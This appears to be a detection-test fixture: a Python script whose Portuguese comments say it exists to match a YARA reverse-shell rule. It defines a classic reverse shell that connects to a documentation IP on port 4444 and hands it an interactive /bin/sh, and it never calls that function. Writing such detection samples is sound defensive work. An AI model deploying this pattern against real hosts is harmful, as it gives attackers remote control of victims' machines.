#!/usr/bin/env python3
# REVERSE SHELL DE TESTE — INOFENSIVO. So texto que casa com a regra
# YARA ReverseShellPython. NAO conecta a lugar nenhum (nao tem if __name__
# == "__main__" + sys.exit pra evitar execucao acidental).

import socket
import subprocess
import os

# Padrao classico de reverse shell Python:
def fake_reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("198.51.100.1", 4444))  # IP RFC 5737 — nao existe
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

# IMPORTANTE: NAO rodamos a funcao. So a definicao serve pro YARA ter
# o que casar. Em ambiente real, atacante teria a chamada.
print("Reverse shell template (NAO executar)")
